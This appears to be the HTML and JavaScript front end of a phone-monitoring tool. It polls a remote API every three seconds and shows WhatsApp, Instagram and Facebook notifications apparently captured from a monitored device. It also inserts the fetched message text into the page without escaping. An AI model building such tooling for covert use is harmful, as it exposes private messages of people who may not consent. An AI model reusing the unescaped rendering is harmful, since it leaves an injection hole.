<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Notifications</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }

        body {
            background-color: #000; /* Pitch Black Background */
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden; /* Body scroll band */
        }

        /* --- Main Phone Container --- */
        .phone-container {
            width: 100%;
            max-width: 600px; /* Mobile width look */
            height: 100vh; /* Full Height */
            background-color: #121212; /* Dark Grey Surface */
            display: flex;
            flex-direction: column;
            border-right: 1px solid #333;
            border-left: 1px solid #333;
            position: relative;
        }

        /* --- 1. Header (Fixed) --- */
        .header {
            padding: 20px;
            background-color: #121212;
            border-bottom: 1px solid #2a2a2a;
            z-index: 10;
            flex-shrink: 0; /* Header chota nahi hoga */
        }

        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .header-title {
            font-size: 20px;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 10px;
            color: #e0e0e0;
        }

        /* Filter Chips */
        .filters {
            display: flex;
            gap: 10px;
            overflow-x: auto;
            padding-bottom: 5px;
        }
        /* Scrollbar hide karna filters ke liye */
        .filters::-webkit-scrollbar { display: none; }

        .chip {
            background: #2a2a2a;
            color: #888;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 13px;
            border: 1px solid #333;
            white-space: nowrap;
            cursor: pointer;
            transition: 0.3s;
        }

        .chip.active {
            background: #4caf50;
            color: #000;
            font-weight: bold;
            border-color: #4caf50;
        }

        /* --- 2. List Area (Scrollable) --- */
        .notification-list {
            flex-grow: 1; /* Bachi hui jagah lega */
            overflow-y: auto; /* Sirf ye area scroll karega */
            padding: 15px;
            padding-bottom: 50px;
        }

        /* Custom Scrollbar */
        .notification-list::-webkit-scrollbar { width: 5px; }
        .notification-list::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }

        /* --- 3. Card Design (Photo Jaisa) --- */
        .card {
            background-color: #1e1e1e;
            border-radius: 15px;
            padding: 15px;
            margin-bottom: 12px;
            display: flex;
            align-items: flex-start;
            gap: 15px;
            border: 1px solid #333;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
            position: relative;
        }

        /* Icon Box */
        .icon-box {
            width: 42px;
            height: 42px;
            border-radius: 12px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 20px;
            flex-shrink: 0; /* ðŸ”¥ IMPORTANT: Icon kabhi pichkega nahi */
        }

        /* Specific App Colors */
        .app-whatsapp { background: rgba(37, 211, 102, 0.1); color: #25D366; border: 1px solid #25D366; }
        .app-facebook { background: rgba(24, 119, 242, 0.1); color: #1877F2; border: 1px solid #1877F2; }
        .app-instagram { background: rgba(225, 48, 108, 0.1); color: #E1306C; border: 1px solid #E1306C; }
        .app-default { background: #333; color: #aaa; border: 1px solid #555; }

        /* Text Content */
        .content {
            flex: 1; /* Text baki jagah lega */
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .row-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 4px;
        }

        .sender-name {
            font-size: 15px;
            font-weight: 700;
            color: #fff; /* Sender name White */
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 70%;
        }

        .time {
            font-size: 12px;
            color: #888;
            font-weight: 500;
        }

        .message-text {
            font-size: 14px;
            color: #aaa; /* Message Grey */
            line-height: 1.3;
            /* 2 Line limit */
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            overflow: hidden;
        }

    </style>
</head>
<body>

    <div class="phone-container">
        
        <div class="header">
            <div class="header-top">
                <div class="header-title">
                    <i class="fas fa-arrow-left" style="cursor:pointer" onclick="history.back()"></i>
                    <span>Notifications</span>
                </div>
                <i class="fas fa-sync-alt" style="cursor:pointer; color:#4caf50" onclick="location.reload()"></i>
            </div>
            
            <div class="filters">
                <div class="chip active" onclick="filter('all', this)">All</div>
                <div class="chip" onclick="filter('whatsapp', this)">WhatsApp</div>
                <div class="chip" onclick="filter('instagram', this)">Instagram</div>
                <div class="chip" onclick="filter('facebook', this)">Facebook</div>
            </div>
        </div>

        <div class="notification-list" id="listContainer">
            <p style="text-align:center; color:#555; margin-top:50px;">Loading live data...</p>
        </div>

    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id');
        const API_URL = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;

        let allData = [];
        let currentFilter = 'all';

        function renderData(data) {
            const container = document.getElementById('listContainer');
            container.innerHTML = "";

            if (!data || data.length === 0) {
                container.innerHTML = "<p style='text-align:center; color:#555; margin-top:20px'>No notifications yet.</p>";
                return;
            }

            // Naya message sabse upar
            data.reverse().forEach(item => {
                const appName = (item.appName || "system").toLowerCase();
                const title = item.title || "Unknown";
                const text = item.text || "New Message";
                
                // Icon Logic
                let iconClass = 'app-default';
                let iconHtml = '<i class="fas fa-bell"></i>';

                if (appName.includes("whatsapp")) {
                    iconClass = 'app-whatsapp';
                    iconHtml = '<i class="fab fa-whatsapp"></i>';
                } else if (appName.includes("facebook")) {
                    iconClass = 'app-facebook';
                    iconHtml = '<i class="fab fa-facebook-f"></i>';
                } else if (appName.includes("instagram")) {
                    iconClass = 'app-instagram';
                    iconHtml = '<i class="fab fa-instagram"></i>';
                }

                // Time Format (HH:MM)
                let timeDisplay = "Now";
                if (item.postTime) {
                    const date = new Date(parseInt(item.postTime));
                    if (!isNaN(date.getTime())) {
                        let hours = date.getHours().toString().padStart(2, '0');
                        let minutes = date.getMinutes().toString().padStart(2, '0');
                        timeDisplay = `${hours}:${minutes}`;
                    }
                }

                const html = `
                    <div class="card">
                        <div class="icon-box ${iconClass}">
                            ${iconHtml}
                        </div>
                        <div class="content">
                            <div class="row-top">
                                <div class="sender-name">${title}</div>
                                <div class="time">${timeDisplay}</div>
                            </div>
                            <div class="message-text">${text}</div>
                        </div>
                    </div>
                `;
                container.innerHTML += html;
            });
        }

        // Filter Logic
        function filter(type, element) {
            currentFilter = type;
            // Update Active Chip
            document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
            element.classList.add('active');
            
            applyFilter();
        }

        function applyFilter() {
            if (currentFilter === 'all') {
                renderData([...allData]); // Copy array
            } else {
                const filtered = allData.filter(item => 
                    (item.appName || "").toLowerCase().includes(currentFilter)
                );
                renderData(filtered);
            }
        }

        // Auto Fetch Function
        function fetchData() {
            fetch(API_URL)
                .then(res => res.json())
                .then(data => {
                    // Sirf tab update karein jab naya data aaye
                    // For simplicity abhi hum har baar update kar rahe hain taaki live feel aaye
                    allData = data;
                    applyFilter();
                })
                .catch(err => console.error("Error:", err));
        }

        // Initial Load
        fetchData();
        // Har 3 second mein live update
        setInterval(fetchData, 3000);

    </script>
</body>
</html>
